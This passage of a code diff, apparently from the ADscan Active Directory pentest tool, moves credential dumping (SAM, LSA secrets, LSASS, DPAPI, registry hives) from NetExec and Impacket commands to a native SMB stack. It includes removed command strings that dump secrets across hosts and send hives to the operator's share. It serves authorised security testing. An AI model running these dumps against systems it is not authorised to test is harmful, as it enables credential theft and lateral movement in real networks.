+        origin = _DUMP_KIND_ORIGINS.get(dump_kind)
+        if origin:
+            add_kwargs["credential_origin"] = origin
         if include_machine_accounts and username.endswith("$"):
             add_kwargs["verify_credential"] = False
             add_kwargs["skip_hash_cracking"] = True
@@ -599,6 +1386,143 @@ def _persist_bulk_sam_local_credentials(
         )
 
 
+def _load_dpapi_ad_users(shell: Any, domain: str) -> set[str]:
+    """Return lowercase set of enabled AD users from the workspace file."""
+    try:
+        domains_dir = getattr(shell, "domains_dir", "") or ""
+        path = domain_relpath(domains_dir, domain, "enabled_users.txt")
+        if not os.path.exists(path):
+            return set()
+        with open(path, encoding="utf-8") as fh:
+            return {line.strip().lower() for line in fh if line.strip()}
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        return set()
+
+
+def _persist_dpapi_result(
+    shell: Any,
+    result: "DpapiFullDumpResult",
+    *,
+    domain: str,
+    host: str,
+    enriched: "list | None" = None,
+    source_protocol: str = "smb",
+) -> None:
+    """Persist DPAPI dump result to workspace file + credentials store.
+
+    When ``enriched`` is provided (list of ``DpapiVerifiedCredential``), the
+    intel file includes classification + verification status for every
+    credential and only domain-verified entries are added to the workspace
+    credential store. Raw result.credentials are used as fallback.
+    """
+    from adscan_internal.services.exploitation.dpapi_credential_processor import (
+        DpapiVerifiedCredential,
+    )
+
+    domains_dir = getattr(shell, "domains_dir", "") or ""
+    if not domains_dir:
+        return
+
+    # Human-readable intel file (written regardless of verification outcome).
+    output_path = _dump_output_path(
+        domains_dir=domains_dir,
+        domain=domain,
+        dump_kind="dpapi",
+        requested_host=host,
+    )
+    try:
+        lines = [
+            f"# DPAPI dump  ·  {host}  ·  mode={result.mode}",
+            f"# Masterkeys: {len(result.decrypted_masterkeys)}/"
+            f"{len(result.decrypted_masterkeys) + len(result.locked_masterkeys)}",
+            f"# Elapsed: {result.elapsed_seconds:.1f}s",
+            "",
+        ]
+        if enriched:
+            for ev in enriched:
+                cred = ev.raw
+                lines.append(
+                    f"[{ev.kind.upper()}] [{ev.verify_status}] "
+                    f"[{cred.win_user}] {cred.target} "
+                    f"→ {cred.username}:{cred.password}"
+                )
+        else:
+            for cred in result.credentials:
+                lines.append(
+                    f"[{cred.source.upper()}] [{cred.win_user}] {cred.target} "
+                    f"→ {cred.username}:{cred.password}"
+                )
+        os.makedirs(os.path.dirname(output_path), exist_ok=True)
+        with open(output_path, "w", encoding="utf-8") as fh:
+            fh.write("\n".join(lines) + "\n")
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        print_info_debug(f"[dpapi] persist file failed: {exc}")
+
+    # Backup key PVK (DA branch)
+    if result.backup_key_pvk and domains_dir:
+        pvk_path = os.path.join(domains_dir, domain, "smb", f"{domain}_backup.pvk")
+        try:
+            os.makedirs(os.path.dirname(pvk_path), exist_ok=True)
+            with open(pvk_path, "wb") as fh:
+                fh.write(result.backup_key_pvk)
+            print_info_verbose(f"Backup key saved: {pvk_path}")
+        except Exception as exc:  # noqa: BLE001
+            telemetry.capture_exception(exc)
+
+    # Credentials store: only newly verified AD credentials.
+    # Verified means we obtained a valid TGT with win_user + password.
+    # The win_user IS the AD account, and verified_password is the confirmed cred.
+    if enriched:
+        for ev in enriched:
+            if not isinstance(ev, DpapiVerifiedCredential):
+                continue
+            if ev.verify_status != "verified" or not ev.verified_ad_user:
+                continue
+            try:
+                shell.add_credential(
+                    domain,
+                    ev.verified_ad_user,
+                    ev.verified_password or "",
+                    source_steps=_build_dump_source_steps(
+                        domain=domain,
+                        dump_kind="DPAPI",
+                        host=host,
+                        auth_username=None,
+                        credential_username=ev.verified_ad_user,
+                        secret=ev.verified_password or "",
+                        source_protocol=source_protocol,
+                    ),
+                    credential_origin="dpapi",
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+    else:
+        # Fallback: no enrichment → persist all with a password (old behaviour).
+        for cred in result.credentials:
+            if not cred.password:
+                continue
+            try:
+                shell.add_credential(
+                    domain,
+                    cred.username,
+                    cred.password,
+                    source_steps=_build_dump_source_steps(
+                        domain=domain,
+                        dump_kind="DPAPI",
+                        host=host,
+                        auth_username=None,
+                        credential_username=cred.username,
+                        secret=cred.password,
+                        source_protocol=source_protocol,
+                    ),
+                    credential_origin="dpapi",
+                )
+            except Exception as exc:  # noqa: BLE001
+                telemetry.capture_exception(exc)
+
+
 def _run_optional_local_admin_reuse_validation(
     shell: Any,
     *,
@@ -671,7 +1595,7 @@ def _run_optional_local_admin_reuse_validation(
             "Domain": marked_domain,
             "Reusable Candidates": str(candidate_count),
             "Discovery Scope": "SAM dump (all hosts)",
-            "Validation Method": "NetExec local-auth (Pwn3d required)",
+            "Validation Method": "native local-auth (admin access required)",
         },
         default=True,
         icon="🔁",
@@ -789,16 +1713,10 @@ def _supports_local_reuse_execution(shell: Any) -> bool:
     """Return True when shell can execute local credential reuse validation."""
     required = (
         "is_hash",
-        "build_auth_nxc",
-        "netexec_path",
         "execute_local_cred_reuse",
     )
     for attr in required:
         value = getattr(shell, attr, None)
-        if attr == "netexec_path":
-            if not value:
-                return False
-            continue
         if not callable(value):
             return False
     return True
@@ -865,7 +1783,7 @@ def _run_single_host_local_admin_reuse_validation(
     if not _supports_local_reuse_execution(shell):
         print_info_debug(
             "[sam_reuse] Skipping single-host local reuse validation: shell "
-            "does not expose required NetExec reuse helpers."
+            "does not expose required local reuse helpers."
         )
         return
 
@@ -879,7 +1797,7 @@ def _run_single_host_local_admin_reuse_validation(
                 f"Source Host: {marked_source_host}",
                 "",
                 "Select which extracted local credentials should be tested",
-                "across all enabled hosts using NetExec local-auth.",
+                "across all enabled hosts using local-auth validation.",
                 "ADscan records LocalAdminPassReuse only on confirmed Pwn3d hits.",
             ]
         ),
@@ -923,14 +1841,14 @@ def _run_single_host_local_admin_reuse_validation(
     if not confirm_operation(
         operation_name="Local Credential Reuse Validation",
         description=(
-            "Runs NetExec local-auth reuse validation on selected credentials and "
+            "Runs local-auth reuse validation on selected credentials and "
             "records LocalAdminPassReuse steps only for confirmed admin hits."
         ),
         context={
             "Domain": marked_domain,
             "Source Host": marked_source_host,
             "Selected Candidates": str(len(selected_rows)),
-            "Validation Method": "NetExec local-auth (Pwn3d required)",
+            "Validation Method": "native local-auth (admin access required)",
         },
         default=True,
         icon="🔁",
@@ -1090,7 +2008,7 @@ def _run_optional_domain_account_reuse_validation(
         operation_name="Domain Reuse Validation",
         description=(
             "Tests whether SAM-derived credentials are also valid for domain users "
-            "using password spraying (Kerberos for passwords, NetExec for NTLM hashes)."
+            "using native password spraying where supported."
         ),
         context={
             "Domain": marked_domain,
@@ -1967,6 +2885,7 @@ def process_dpapi_output(
                     secret=password,
                     source_protocol=source_protocol,
                 ),
+                credential_origin="dpapi",
             )
         print_success(f"Credential saved for {marked_username}")
         processed_creds.add(dedupe_key)
@@ -1984,34 +2903,6 @@ def process_dpapi_output(
     return {"count": len(processed_creds), "bulk_mode": bulk_mode}
 
 
-def _build_delegate_suffix(shell: Any, domain: str, username: str) -> str:
-    """Return NetExec delegation args when using a machine account for SMB."""
-    from adscan_internal.principal_utils import is_machine_account
-
-    if not is_machine_account(username):
-        return ""
-    try:
-        admins = shell.get_domain_admins(domain)
-    except Exception as exc:  # noqa: BLE001
-        telemetry.capture_exception(exc)
-        admins = []
-    if not admins:
-        marked_domain = mark_sensitive(domain, "domain")
-        print_warning(
-            f"Domain Admins list unavailable for {marked_domain}; "
-            "skipping SMB delegation flags."
-        )
-        return ""
-    delegate_user = str(admins[0]).strip()
-    if not delegate_user:
-        return ""
-    marked_delegate = mark_sensitive(delegate_user, "user")
-    print_info_debug(
-        f"[dump] Using SMB delegation for machine account via {marked_delegate}."
-    )
-    return f" --delegate {delegate_user} --self"
-
-
 def run_dump_registries(
     shell: Any,
     *,
@@ -2019,32 +2910,132 @@ def run_dump_registries(
     username: str,
     password: str,
 ) -> None:
-    """Dump SAM/SECURITY/SYSTEM registry hives from the PDC using Impacket reg.py."""
-    from adscan_internal import print_operation_header
+    """Dump SAM/SECURITY/SYSTEM registry hives from the PDC via native async RRP.
 
-    print_operation_header(
-        "Registry Dump",
-        details={
-            "Domain": domain,
-            "Target": "PDC Registry Hives",
-            "Username": username,
-            "Output": f"\\\\{shell.myip}\\smbFolder",
-        },
-        icon="📋",
+    Replaces the impacket reg.py subprocess + SMB share receiver approach.
+    Uses NativeDumpService.backup_operator_dump() which opens the hives with
+    REG_OPTION_BACKUP_RESTORE, downloads via ADMIN$, and parses in-process.
+    No smbFolder, no impacket_scripts_dir dependency.
+    """
+    import tempfile
+    from adscan_internal.services.async_bridge import run_async_sync
+    from adscan_internal.services.exploitation.native_dump_service import (
+        NativeDumpService,
     )
+    from adscan_internal.services.exploitation.dump_display import (
+        DumpDisplay,
+        CredentialType,
+    )
+    from adscan_internal.services.smb_transport import SMBConfig
 
-    shell.do_open_smb(domain)
-    if not shell.impacket_scripts_dir:
-        print_error(
-            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-        )
+    pdc_ip: str = str(shell.domains_data.get(domain, {}).get("pdc") or "")
+    pdc_hostname: str | None = shell.domains_data.get(domain, {}).get("pdc_hostname")
+
+    if not pdc_ip:
+        print_error("Registry dump requires a PDC IP. Run enumeration first.")
         return
 
-    reg_path = os.path.join(shell.impacket_scripts_dir, "reg.py")
-    auth = shell.build_auth_impacket(username, password, domain)
-    command = f"{reg_path} {auth} backup -o '\\\\{shell.myip}\\smbFolder'"
-    print_info_debug(f"Command: {command}")
-    execute_dump_registries(shell, command, domain)
+    marked_domain = mark_sensitive(domain, "domain")
+    marked_pdc = mark_sensitive(pdc_ip, "ip")
+
+    display = DumpDisplay()
+    display.operation_header(
+        "Registry Dump (native RRP)", pdc_hostname or pdc_ip, phases=2
+    )
+    display.phase_start(1, 2, f"Saving SAM / SECURITY / SYSTEM from {marked_pdc}")
+
+    is_hash = len(password) == 32 and all(
+        c in "0123456789abcdef" for c in password.lower()
+    )
+    smb_config = SMBConfig(
+        target_ip=pdc_ip,
+        target_hostname=pdc_hostname,
+        domain=domain,
+        auth_domain=domain,
+        username=username,
+        password=None if is_hash else password,
+        nt_hash=password if is_hash else None,
+        kdc_ip=pdc_ip,
+        use_kerberos=False,
+    )
+
+    with tempfile.TemporaryDirectory(prefix="adscan-regdump-") as tmp:
+        result = run_async_sync(
+            NativeDumpService().backup_operator_dump(smb_config, workspace_dir=tmp)
+        )
+
+    if not result.success:
+        display.phase_error(f"Registry dump failed: {result.error or 'unknown'}")
+        return
+
+    display.phase_success(
+        f"Hives downloaded  ·  SAM: {len(result.sam_hashes)} accounts"
+        f"  | LSA: {len(result.lsa_secrets)} secrets"
+    )
+
+    display.phase_start(2, 2, "Streaming credentials")
+    display.start_credential_stream(f"Registry  ·  {marked_domain}")
+
+    _EMPTY = "31d6cfe0d16ae931b73c59d7e0c089c0"
+    stored: list[tuple[str, str]] = []
+
+    for sam in result.sam_hashes:
+        if sam.nt_hash and sam.nt_hash != _EMPTY:
+            display.stream_credential(CredentialType.SAM, sam.username, sam.nt_hash)
+            stored.append((sam.username, sam.nt_hash))
+
+    if result.machine_account_nt_hash:
+        dc_acct = f"{(pdc_hostname or 'DC').upper()}$"
+        display.stream_credential(
+            CredentialType.LSA, dc_acct, result.machine_account_nt_hash, extras="[DC$]"
+        )
+        stored.append((dc_acct, result.machine_account_nt_hash))
+
+    for secret in result.lsa_secrets:
+        if secret.plaintext and secret.name not in ("$MACHINE.ACC",):
+            display.stream_credential(
+                CredentialType.LSA, secret.name, secret.plaintext[:32]
+            )
+
+    display.stop_credential_stream()
+    display.summary(
+        {
+            CredentialType.SAM: len(result.sam_hashes),
+            CredentialType.LSA: len(result.lsa_secrets),
+        },
+        total=len(stored),
+        host=pdc_hostname or pdc_ip,
+        elapsed=0.0,
+    )
+
+    from adscan_internal.cli.machine_account_persist import persist_machine_account_credential
+
+    for acct, nt in stored:
+        if acct.endswith("$"):
+            # Machine account: persist with AES key derivation.
+            persist_machine_account_credential(
+                shell,
+                domain=domain,
+                machine_account=acct,
+                nt_hash=nt,
+                kerberos_password=result.machine_account_kerberos_password,
+                dc_hostname=pdc_hostname,
+                trusted_manual_validation=True,
+                ensure_fresh_kerberos_ticket=False,
+                prompt_for_user_privs_after=False,
+                credential_origin="backup_operators",
+                skip_hash_cracking=True,
+                verify_credential=False,
+            )
+        else:
+            shell.add_credential(
+                domain,
+                acct,
+                nt,
+                skip_hash_cracking=False,
+                prompt_for_user_privs_after=False,
+                credential_origin="sam_dump",
+            )
 
 
 def run_secretsdump_registries(
@@ -2054,40 +3045,12 @@ def run_secretsdump_registries(
     sam_path: str | None = None,
     system_path: str | None = None,
 ) -> None:
-    """Run secretsdump.py against locally saved SAM/SYSTEM hives for a domain."""
-    from adscan_internal import print_operation_header
-
-    if not shell.impacket_scripts_dir:
-        print_error(
-            "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
-        )
-        return
-
-    secretsdump_path = os.path.join(shell.impacket_scripts_dir, "secretsdump.py")
-    if not os.path.isfile(secretsdump_path) or not os.access(secretsdump_path, os.X_OK):
-        print_error(
-            f"secretsdump.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
-        )
-        return
-
-    print_operation_header(
-        "NTLM Hash Extraction",
-        details={
-            "Domain": domain,
-            "Source": "Registry Hives (SAM + SYSTEM)",
-            "Method": "secretsdump.py",
-            "Target": "LOCAL",
-        },
-        icon="🔑",
+    """Reject secretsdump.py registry parsing after native migration."""
+    _ = (shell, domain, sam_path, system_path)
+    print_error(
+        "secretsdump.py registry parsing has been removed. "
+        "Use the native registry dump parser instead."
     )
-
-    sam_arg = sam_path or "SAM.save"
-    system_arg = system_path or "SYSTEM.save"
-    command = f"{secretsdump_path} -sam {sam_arg} -system {system_arg} LOCAL"
-    print_info_debug(f"Command: {command}")
-    from adscan_internal.cli.secretsdump import execute_secretsdump
-
-    execute_secretsdump(shell, command, domain)
 
 
 def run_dump_lsass(
@@ -2099,201 +3062,45 @@ def run_dump_lsass(
     password: str,
     islocal: str | None = None,  # kept for future extensions
 ) -> None:
-    """Dump LSASS using LSA-Reaper (hash or password auth)."""
-    if str(password or "").lower().endswith(".ccache"):
-        _run_dump_lsass_with_delegated_ticket(
+    """Dump LSASS using the native async SMB stack only."""
+    if _is_bulk_dump_target(host):
+        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
+        with _temporary_dump_creds(
             shell,
             domain=domain,
-            host=host,
             username=username,
-            kerberos_ticket=password,
+            secret=password,
+            islocal=islocal,
+        ):
+            _native_execute_dump_lsass_bulk(shell, domain=domain, hosts=hosts)
+        return
+
+    if not _explicit_native_dump_supported(
+        host=host, username=username, secret=password
+    ):
+        print_warning(
+            "Native LSASS dump requires a single host and explicit credentials. "
+            "For bulk LSASS dumping use 'All' or a valid targets file."
         )
         return
 
-    command = _build_legacy_lsa_reaper_command(
+    marked_host = mark_sensitive(host, "hostname")
+    print_info(f"Dumping LSASS from host {marked_host} with native async SMB")
+    with _temporary_dump_creds(
         shell,
         domain=domain,
-        host=host,
         username=username,
-        password=password,
-    )
-    if not command:
-        return
-
-    marked_host = mark_sensitive(host, "hostname")
-    print_info(f"Dumping LSASS from host {marked_host}")
-    execute_dump_lsass(shell, command, domain, host)
-
-
-def _resolve_lsa_reaper_python(shell: Any) -> str | None:
-    """Resolve the Python interpreter to run LSA-Reaper."""
-    return resolve_lsa_reaper_python(
-        explicit_python=str(getattr(shell, "lsa_reaper_python", "") or "").strip()
-    )
-
-
-def _resolve_lsa_reaper_script_path() -> str | None:
-    """Resolve the installed LSA-Reaper script path across host/runtime layouts."""
-    from adscan_internal.cli.tools_env import TOOLS_INSTALL_DIR
-
-    return resolve_lsa_reaper_script_path(tools_install_dir=TOOLS_INSTALL_DIR)
-
-
-def _build_legacy_lsa_reaper_command(
-    shell: Any,
-    *,
-    domain: str,
-    host: str,
-    username: str,
-    password: str,
-) -> str | None:
-    """Build the legacy LSA-Reaper command for password/hash-based dumping."""
-    lsa_reaper_python = _resolve_lsa_reaper_python(shell)
-    lsa_reaper_path = _resolve_lsa_reaper_script_path()
-    if not lsa_reaper_python or not lsa_reaper_path:
-        print_error(
-            "LSA-Reaper is not installed correctly. Please run 'adscan install' "
-            "or fix the LSA-Reaper runtime."
-        )
-        return None
-
-    marked_domain = mark_sensitive(domain, "domain")
-    marked_username = mark_sensitive(username, "user")
-    marked_host = mark_sensitive(host, "hostname")
-    marked_password = mark_sensitive(password, "password")
-    marked_pdc = mark_sensitive(shell.domains_data[domain]["pdc"], "hostname")
-
-    return build_lsa_reaper_command(
-        LsaReaperCommandRequest(
-            python_path=lsa_reaper_python,
-            script_path=lsa_reaper_path,
-            interface=str(shell.interface),
-            pdc=marked_pdc,
-            domain=marked_domain,
-            host=marked_host,
-            username=marked_username,
-            password=marked_password,
-            log_dir=domain_relpath(shell.domains_dir, domain, "smb"),
-            is_hash=bool(shell.is_hash(password)),
-        )
-    )
-
-
-def _resolve_wmiexec_script(shell: Any) -> str | None:
-    """Resolve wmiexec.py from the configured Impacket installation."""
-    return resolve_wmiexec_script(
-        impacket_scripts_dir=str(getattr(shell, "impacket_scripts_dir", "") or "").strip()
-    )
-
-
-def _resolve_lsassy_script(shell: Any) -> str | None:
-    """Resolve lsassy from the configured isolated installation."""
-    return resolve_lsassy_executable(
-        explicit_path=str(getattr(shell, "lsassy_path", "") or "").strip()
-    )
+        secret=password,
+        islocal=islocal,
+    ):
+        execute_dump_lsass(shell, "", domain, host)
 
 
 def _parse_lsass_pypykatz_credentials(output: str) -> list[tuple[str, str]]:
     """Extract username/NTLM pairs from pypykatz minidump output."""
-    return [(cred.username, cred.nt_hash) for cred in parse_pypykatz_credentials(output)]
-
-
-def _run_dump_lsass_with_delegated_ticket(
-    shell: Any,
-    *,
-    domain: str,
-    host: str,
-    username: str,
-    kerberos_ticket: str,
-) -> None:
-    """Dump LSASS using delegated Kerberos access via wmiexec + SMB download."""
-    wmiexec_path = _resolve_wmiexec_script(shell)
-    if not wmiexec_path:
-        print_error(
-            "wmiexec.py is not available. Please ensure Impacket is installed."
-        )
-        return
-
-    if not getattr(shell, "netexec_path", None):
-        print_error("NetExec is not available. Please ensure NetExec is installed.")
-        return
-
-    dump_dir = os.path.join(
-        str(getattr(shell, "current_workspace_dir", "") or os.getcwd()),
-        domain_relpath(shell.domains_dir, domain, "smb"),
-    )
-    os.makedirs(dump_dir, exist_ok=True)
-    local_dump_path = os.path.join(
-        dump_dir,
-        f"dump_{_dump_target_token(host)}_lsass.dmp",
-    )
-
-    operation_details = {
-        "Domain": domain,
-        "Target": host,
-        "Username": username,
-        "Auth Type": "Delegated Kerberos Ticket",
-        "Output": local_dump_path,
-    }
-    print_operation_header("LSASS Memory Dump", details=operation_details, icon="🧠")
-
-    dc_ip = str(shell.domains_data.get(domain, {}).get("dc_ip") or "").strip()
-    print_info("Creating remote LSASS dump via wmiexec and delegated Kerberos ticket.")
-    auth_str = shell.build_auth_nxc(username, kerberos_ticket, domain, kerberos=True)
-    outcome = LsassDumpService().dump_with_delegated_ticket(
-        DelegatedLsassDumpRequest(
-            domain=domain,
-            host=host,
-            username=username,
-            kerberos_ticket=kerberos_ticket,
-            wmiexec_path=wmiexec_path,
-            netexec_path=str(shell.netexec_path),
-            pypykatz_path=str(getattr(shell, "pypykatz_path", "") or "pypykatz").strip(),
-            local_dump_path=local_dump_path,
-            nxc_auth=auth_str,
-            dc_ip=dc_ip or None,
-            lsassy_path=_resolve_lsassy_script(shell),
-            preferred_backend="auto",
-            run_command=shell.run_command,
-        )
-    )
-    _render_lsass_dump_outcome(shell, domain=domain, host=host, outcome=outcome)
-
-
-def _render_lsass_dump_outcome(
-    shell: Any,
-    *,
-    domain: str,
-    host: str,
-    outcome: LsassDumpOutcome,
-) -> None:
-    """Render and persist the result of one LSASS dump backend."""
-    if not outcome.success:
-        print_error(
-            f"Error running LSASS dump backend {outcome.backend}: "
-            f"{outcome.error_message or 'unknown error'}"
-        )
-        return
-
-    if outcome.local_dump_path:
-        print_success(
-            "LSASS dump downloaded successfully to "
-            f"{mark_sensitive(outcome.local_dump_path, 'path')}"
-        )
-    else:
-        print_success(f"LSASS dump completed successfully with backend {outcome.backend}.")
-    for credential in outcome.credentials:
-        marked_user = mark_sensitive(credential.username, "user")
-        marked_hash = mark_sensitive(credential.nt_hash, "password")
-        print_info(f"Recovered NTLM hash from LSASS: {marked_user} -> {marked_hash}")
-        shell.add_credential(domain, credential.username, credential.nt_hash)
-    for warning in outcome.warnings:
-        warning_text = str(warning or "").replace(
-            "Standard minidump parsing",
-            f"Standard minidump parsing on {mark_sensitive(host, 'hostname')}",
-            1,
-        )
-        print_warning(warning_text)
+    return [
+        (cred.username, cred.nt_hash) for cred in parse_pypykatz_credentials(output)
+    ]
 
 
 def run_dump_lsa(
@@ -2304,10 +3111,9 @@ def run_dump_lsa(
     password: str,
     host: str,
     islocal: str,
-    include_machine_accounts: bool = False,
+    include_machine_accounts: bool = True,
 ) -> None:
-    """Dump LSA secrets over SMB using NetExec."""
-    kerberos_ticket_prefix = ""
+    """Dump LSA secrets over SMB using the native async SMB stack only."""
     if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
         shell, dump_label="LSA"
     ):
@@ -2331,59 +3137,48 @@ def run_dump_lsa(
 
     print_operation_header("LSA Secrets Dump", details=operation_details, icon="🔓")
 
-    command: str | None = None
-
-    if islocal == "false":
-        use_ccache = password.lower().endswith(".ccache")
-        auth_str = shell.build_auth_nxc(
-            username,
-            password,
-            domain,
-            kerberos=use_ccache,
-        )
-        if use_ccache:
-            kerberos_ticket_prefix = f"KRB5CCNAME={shlex.quote(password)} "
-        delegate_suffix = _build_delegate_suffix(shell, domain, username)
-        if is_multi_host_target:
-            hosts_file = _resolve_bulk_hosts_target(
+    if is_multi_host_target:
+        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
+        with _temporary_dump_creds(
+            shell,
+            domain=domain,
+            username=username,
+            secret=password,
+            islocal=islocal,
+        ):
+            _native_execute_dump_lsa_bulk(
                 shell,
                 domain=domain,
-                requested_host=host,
+                hosts=hosts,
+                auth_username=username,
+                include_machine_accounts=include_machine_accounts,
             )
-            if not hosts_file:
-                print_warning("No multi-host targets are available for this domain.")
-                return
-            log_file = dump_output
-            command = (
-                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {shlex.quote(hosts_file)} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
-                f"--log {log_file} --lsa{delegate_suffix}"
-            )
-        elif host != "All":
-            log_file = dump_output
-            command = (
-                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {host} {auth_str} "
-                f"--log {log_file} --lsa{delegate_suffix}"
-            )
-    else:
-        auth_str = shell.build_auth_nxc(username, password)
-        if host != "All":
-            log_file = dump_output
-            command = (
-                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --lsa"
-            )
-
-    if not command:
         return
 
-    print_info_debug(f"Command: {command}")
-    execute_dump_lsa(
+    if not _explicit_native_dump_supported(
+        host=host, username=username, secret=password
+    ):
+        print_warning(
+            "Native LSA dump requires a single host and explicit credentials. "
+            "For bulk LSA dumping use 'All' or a valid targets file."
+        )
+        return
+
+    with _temporary_dump_creds(
         shell,
-        command,
-        domain,
-        host,
-        auth_username=username,
-        include_machine_accounts=include_machine_accounts,
-    )
+        domain=domain,
+        username=username,
+        secret=password,
+        islocal=islocal,
+    ):
+        execute_dump_lsa(
+            shell,
+            "",
+            domain,
+            host,
+            auth_username=username,
+            include_machine_accounts=include_machine_accounts,
+        )
 
 
 def run_dump_sam(
@@ -2395,7 +3190,7 @@ def run_dump_sam(
     host: str,
     islocal: str,
 ) -> None:
-    """Dump SAM database over SMB using NetExec."""
+    """Dump SAM database over SMB using the native async SMB stack only."""
     if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
         shell, dump_label="SAM"
     ):
@@ -2419,86 +3214,51 @@ def run_dump_sam(
 
     print_operation_header("SAM Database Dump", details=operation_details, icon="💾")
 
-    if islocal == "false":
-        auth_str = shell.build_auth_nxc(username, password, domain)
-        delegate_suffix = _build_delegate_suffix(shell, domain, username)
-        if is_multi_host_target:
-            hosts_file = _resolve_bulk_hosts_target(
+    if is_multi_host_target:
+        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
+        with _temporary_dump_creds(
+            shell,
+            domain=domain,
+            username=username,
+            secret=password,
+            islocal=islocal,
+        ):
+            _native_execute_dump_sam_bulk(
                 shell,
                 domain=domain,
-                requested_host=host,
+                hosts=hosts,
+                auth_username=username,
             )
-            if not hosts_file:
-                print_warning("No multi-host targets are available for this domain.")
-                return
-            log_file = dump_output
-            command = (
-                f"{shell.netexec_path} smb {shlex.quote(hosts_file)} {auth_str} -t 10 --timeout 60 --smb-timeout 30 "
-                f"--log {log_file} --sam{delegate_suffix}"
-            )
-            print_info_debug(f"Command: {command}")
-            execute_dump_sam(shell, command, domain, host, auth_username=username)
-        elif host != "All":
-            log_file = dump_output
-            command = f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam{delegate_suffix}"
-            print_info_debug(f"Command: {command}")
-            execute_dump_sam(shell, command, domain, host, auth_username=username)
-    else:
-        auth_str = shell.build_auth_nxc(username, password)
-        if host != "All":
-            log_file = dump_output
-            command = (
-                f"{shell.netexec_path} smb {host} {auth_str} --log {log_file} --sam"
-            )
-            print_info_debug(f"Command: {command}")
-            execute_dump_sam(shell, command, domain, host, auth_username=username)
+        return
+
+    if not _explicit_native_dump_supported(
+        host=host, username=username, secret=password
+    ):
+        print_warning(
+            "Native SAM dump requires a single host and explicit credentials. "
+            "For bulk SAM dumping use 'All' or a valid targets file."
+        )
+        return
+
+    with _temporary_dump_creds(
+        shell,
+        domain=domain,
+        username=username,
+        secret=password,
+        islocal=islocal,
+    ):
+        execute_dump_sam(shell, "", domain, host, auth_username=username)
 
 
 def run_dump_sam_winrm(
     shell: Any, *, domain: str, username: str, password: str, host: str
 ) -> None:
-    """Dump SAM credentials over WinRM using NetExec."""
-    auth_str = shell.build_auth_nxc(username, password, domain)
-    if host == "All":
-        marked_domain = mark_sensitive(domain, "domain")
-        hosts_file = _resolve_bulk_hosts_target(
-            shell,
-            domain=domain,
-            requested_host=host,
-        )
-        if not hosts_file:
-            print_warning("No multi-host targets are available for this domain.")
-            return
-        log_file = domain_relpath(
-            shell.domains_dir, domain, "winrm", "dump_all_sam.txt"
-        )
-        command = (
-            f"{shell.netexec_path} winrm {shlex.quote(hosts_file)} "
-            f"{auth_str} -t 16 --log {log_file} "
-            "--sam --dump-method powershell | awk '{print $5}' | "
-            "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
-        )
-        print_info(f"Dumping SAM credentials from all hosts in domain {marked_domain}")
-        print_info_debug(f"Command: {command}")
-        execute_dump_sam(shell, command, domain, "All", auth_username=username)
-        return
-
-    marked_host = mark_sensitive(host, "hostname")
-    marked_domain = mark_sensitive(domain, "domain")
-    log_file = domain_relpath(
-        shell.domains_dir, domain, "winrm", f"dump_{host}_sam.txt"
+    """WinRM SAM dumping is disabled until a native WinRM backend exists."""
+    _ = (shell, domain, username, password, host)
+    print_warning(
+        "WinRM SAM dumping previously depended on an external command. "
+        "It is disabled until the native WinRM dump backend is implemented."
     )
-    command = (
-        f"{shell.netexec_path} winrm {marked_host} {auth_str} "
-        f"--log {log_file} "
-        "--sam --dump-method powershell | awk '{print $5}' | "
-        "grep -a -vE '\\]|Guest|Invitado|DefaultAccount|WDAGUtilityAccount' | awk 'NF'"
-    )
-    print_info(
-        f"Dumping SAM credentials from host {marked_host} in domain {marked_domain}"
-    )
-    print_info_debug(f"Command: {command}")
-    execute_dump_sam(shell, command, domain, host, auth_username=username)
 
 
 def run_dump_dpapi(
@@ -2510,8 +3270,7 @@ def run_dump_dpapi(
     host: str,
     islocal: str,
 ) -> None:
-    """Dump DPAPI credentials over SMB using NetExec."""
-    kerberos_ticket_prefix = ""
+    """Dump DPAPI material over SMB using the native async SMB stack only."""
     if _is_bulk_dump_target(host) and not _ensure_pro_for_all_hosts_dump(
         shell, dump_label="DPAPI"
     ):
@@ -2537,90 +3296,1456 @@ def run_dump_dpapi(
         "DPAPI Credentials Dump", details=operation_details, icon="🔐"
     )
 
-    command: str | None = None
-    if islocal == "false":
-        use_ccache = password.lower().endswith(".ccache")
-        auth_str = shell.build_auth_nxc(
-            username,
-            password,
-            domain,
-            kerberos=use_ccache,
-        )
-        if use_ccache:
-            kerberos_ticket_prefix = f"KRB5CCNAME={shlex.quote(password)} "
-        delegate_suffix = _build_delegate_suffix(shell, domain, username)
-        if is_multi_host_target:
-            hosts_target = _resolve_bulk_hosts_target(
-                shell,
-                domain=domain,
-                requested_host=host,
-            )
-            if not hosts_target:
-                print_warning("No multi-host targets are available for this domain.")
-                return
-            command = (
-                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {shlex.quote(hosts_target)} "
-                f"{auth_str} -t 1 --timeout 60 --smb-timeout 30 --log "
-                f"{dump_output} --dpapi{delegate_suffix} "
-            )
-        elif host != "All":
-            command = (
-                f"{kerberos_ticket_prefix}{shell.netexec_path} smb {host} {auth_str} --log "
-                f"{dump_output} --dpapi{delegate_suffix} "
-            )
-    else:
-        auth_str = shell.build_auth_nxc(username, password)
-        if host != "All":
-            command = (
-                f"{shell.netexec_path} smb {host} {auth_str} --log "
-                f"{dump_output} --dpapi "
-            )
+    if is_multi_host_target:
+        hosts = _resolve_native_bulk_hosts(shell, domain=domain, requested_host=host)
+        with _temporary_dump_creds(
+            shell,
+            domain=domain,
+            username=username,
